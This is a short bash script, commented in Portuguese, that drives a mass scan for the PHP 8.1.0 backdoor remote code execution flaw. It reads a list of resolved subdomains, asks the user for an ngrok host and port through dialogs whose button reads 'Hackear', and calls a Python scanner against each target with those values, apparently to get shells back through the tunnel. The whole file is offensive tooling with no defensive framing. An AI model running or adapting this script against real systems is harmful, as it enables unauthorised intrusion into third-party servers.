#!/bin/bash

#SCAN RCE BACKDOOR PHP
data=$(date +"%H:%M:%S");
echo -e "\033[1;34;40m"$data"\033[m \033[05;33m<<SCANEANDO RCE PHP (8.1.0) BACKDOOR />\033[00;37m";

#Diretório atual de execução e NGROK PARA OBTER RCE
terminator -e "bash scan_RCEPHP_IP.sh" &
pasta=$(pwd);

ngrok=$(zenity --forms    \
    --title="RCE PHP"    \
    --text="Digite o NGROK" \
    --add-entry="NGROK" \
    --separator="," \
    --ok-label="Hackear"
    );

porta=$(zenity --forms    \
    --title="RCE PHP"    \
    --text="Digite a PORTA NGROK" \
    --add-entry="PORTA" \
    --separator="," \
    --ok-label="Hackear"
    );

for url in $(cat $pasta"/scanner/"$1"/resultados/subsResolvidos.txt");do
	data=$(date +"%H:%M:%S");
	echo -e "\033[1;34;40m"$data"\033[m \033[33m>>SCAN==>> \033[00;37m"$url;
	python3 scan_RCEPHP.py $url $ngrok $porta;
done

bash;
